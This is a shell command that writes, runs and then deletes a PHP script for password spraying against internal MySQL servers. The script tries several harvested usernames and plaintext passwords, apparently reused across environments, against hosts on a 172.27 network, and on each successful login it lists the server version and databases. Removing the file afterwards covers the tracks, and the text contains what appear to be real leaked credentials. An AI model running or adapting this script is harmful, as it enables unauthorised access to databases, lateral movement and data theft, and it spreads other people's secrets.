cat > /tmp/spray.php << 'PHPEOF'
<?php
error_reporting(0);
$tests = array(
    // env-generator creds vs MySQL-DEV
    array("DEV_ares",   "172.27.140.151", 3306, "ares_user", "Nic3.P4ssw0rd"),
    array("DEV_aresSA", "172.27.140.151", 3306, "ares_sa",   "Nic3.P4ssw0rd"),
    array("DEV_root",   "172.27.140.151", 3306, "root",      "Nic3.P4ssw0rd"),
    // known T1 creds
    array("T1_141.4_3310", "172.27.141.4", 3310, "app_t1", "wUt22Us2CUh#+M="),
    array("T1_141.6_3310", "172.27.141.6", 3310, "app_t1", "wUt22Us2CUh#+M="),
    array("T1_141.26",     "172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S"),
    array("T1_141.4_3306", "172.27.141.4", 3306, "app_t1", "wUt22Us2CUh#+M="),
    // sears fincado
    array("SEARS_141.6_3308", "172.27.141.6", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("SEARS_141.6_3306", "172.27.141.6", 3306, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("SEARS_141.4",      "172.27.141.4", 3306, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    // env-gen pattern reuse on sears/mysql hosts
    array("PAT_141.6_3308_ares", "172.27.141.6", 3308, "ares_user", "Nic3.P4ssw0rd"),
    array("PAT_141.4_ares",      "172.27.141.4", 3306, "ares_user", "Nic3.P4ssw0rd"),
);
foreach ($tests as $t) {
    list($label,$h,$p,$u,$pw) = $t;
    $conn = @mysqli_init();
    @mysqli_options($conn, MYSQLI_OPT_CONNECT_TIMEOUT, 5);
    $ok = @mysqli_real_connect($conn, $h, $u, $pw, "", $p);
    if ($ok) {
        echo "AUTH_OK|$label|$h:$p|$u\n";
        $r = @mysqli_query($conn, "SELECT VERSION() v, CURRENT_USER() cu");
        if ($r) { $row = mysqli_fetch_row($r); echo "  VERSION=".$row[0]." USER=".$row[1]."\n"; }
        $r = @mysqli_query($conn, "SHOW DATABASES");
        if ($r) { while ($row = mysqli_fetch_row($r)) { echo "  DB: ".$row[0]."\n"; } }
        mysqli_close($conn);
    } else {
        echo "AUTH_FAIL|$label|$h:$p|$u|".mysqli_connect_error()."\n";
    }
}
echo "SPRAY_DONE\n";
?>
PHPEOF
php /tmp/spray.php
rm -f /tmp/spray.php
